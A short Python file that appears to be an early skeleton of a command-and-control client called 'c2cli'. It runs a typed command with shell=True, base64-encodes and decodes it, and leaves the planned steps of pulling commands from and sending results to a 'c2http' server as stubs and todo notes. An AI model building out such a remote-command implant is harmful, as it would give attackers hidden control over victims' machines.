import base64
from subprocess import check_output as cmd_ouput
# import request
# Use 'del <module>' to unload a module.  Reduce mem usage?


# todo: setup proxy
# todo: connect to c2http over http protocol


def header():
	print("----------")
	print("  c2cli")
	print("----------")


def tmp_get_cmd():
    # todo: remove this when c2http.py is working
    return input("[+] Type CMD > ")


def get_cmd_from_c2http():
    # Connect to c2http server and pull/rcv commands
    pass


def execute_cmd(cmd):
    # todo: put in simple error handling
    return cmd_ouput(cmd, shell=True)
	

def send_result_to_c2http():
    # Send encoded results back to server
    pass

	
def encode_cmd(clear_cmd):
	ecmd = base64.b64encode(clear_cmd.encode())
	#print('encoded_cmd fun:: {}'.format(ecmd))
	return ecmd
	
def decode_cmd(encoded_cmd):
	dcmd = base64.b64decode(encoded_cmd.decode())
	#print('decode_cmd fun:: {}'.format(dcmd))
	return dcmd
	
	
def main():
	header()
	
	# Get and encode cmd locally. 
	# This section will be updated to get cmd from c2http
	#    and decode cmd for execution.
	clear_cmd = tmp_get_cmd()
	encoded_cmd = encode_cmd(clear_cmd)
	print('[+] Encoded CMD is "{}"'.format(encoded_cmd))
	
	# Decode cmd 
	decoded_cmd = decode_cmd(encoded_cmd)
	print('[+] Decoded CMD is "{}"'.format(decoded_cmd))
	
	# Execute and Return Results
	cmdout = execute_cmd(decoded_cmd.decode())
	print("--not binary---" + decoded_cmd.decode())
	print(cmdout.decode())
	
	#todo: send encoded results back to c2http
	

	

if __name__ == "__main__":
		main()
